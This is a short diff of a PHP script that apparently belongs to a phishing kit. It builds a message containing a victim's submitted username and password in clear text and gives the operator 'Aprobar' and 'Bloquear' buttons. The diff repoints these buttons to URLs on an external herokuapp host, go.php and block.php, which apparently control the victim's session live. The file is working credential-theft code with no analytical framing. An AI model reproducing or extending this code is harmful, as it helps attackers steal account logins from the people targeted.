@@ -32,11 +32,11 @@ if($usuario && $clave){
 
         $msg = "🔐 Nuevo acceso\nUsuario: $usuario\nClave: $clave\nID: $id";
 
-        $keyboard = [
+      $keyboard = [
     "inline_keyboard" => [
         [
-            ["text" => "✅ Aprobar", "callback_data" => "GO_$id"],
-            ["text" => "🚫 Bloquear", "callback_data" => "BLOCK_$id"]
+            ["text" => "✅ Aprobar", "url" => "https://bnproam-776ce2b6cb6c.herokuapp.com/go.php?id=$id"],
+            ["text" => "🚫 Bloquear", "url" => "https://bnproam-776ce2b6cb6c.herokuapp.com/block.php?id=$id"]
         ]
     ]
 ];
